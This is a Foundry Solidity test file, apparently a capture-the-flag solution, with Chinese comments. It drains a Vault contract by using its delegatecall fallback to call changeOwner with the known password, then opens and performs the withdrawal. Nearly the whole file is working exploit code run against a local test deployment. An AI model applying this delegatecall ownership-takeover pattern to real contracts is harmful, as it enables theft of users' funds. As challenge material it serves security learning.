// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Vault.sol";


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    /**

      要利用这个 Vault 合约并提取其中的所有资金，可以利用合约的 delegatecall 设计，
      因为 Vault 合约会将传入的调用委托给 VaultLogic 合约，
      这样调用者可以通过 delegatecall 来更改 Vault 合约的 owner 状态变量。

      使用恶意 password 调用 VaultLogic.changeOwner 函数，并更改 Vault 的 owner。
      调用 Vault.openWithdraw() 来启用提款权限。
      调用 Vault.withdraw() 提取所有资金。
    
     */
    function testExploit() public {
      vm.deal(palyer, 1 ether);
      vm.startPrank(palyer);
        // 利用 fallback 机制调用 VaultLogic 的 changeOwner 函数，以更改 Vault 的 owner 为 palyer
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32("0x1234"), palyer)
        );
        require(success, "changeOwner failed");

        // palyer 已经是 Vault 的 owner，调用 openWithdraw 函数来启用提现
        vault.openWithdraw();

        // 调用 withdraw 函数提取所有资金
        vault.withdraw();

        require(vault.isSolve(), "solved");
      vm.stopPrank();
    }

}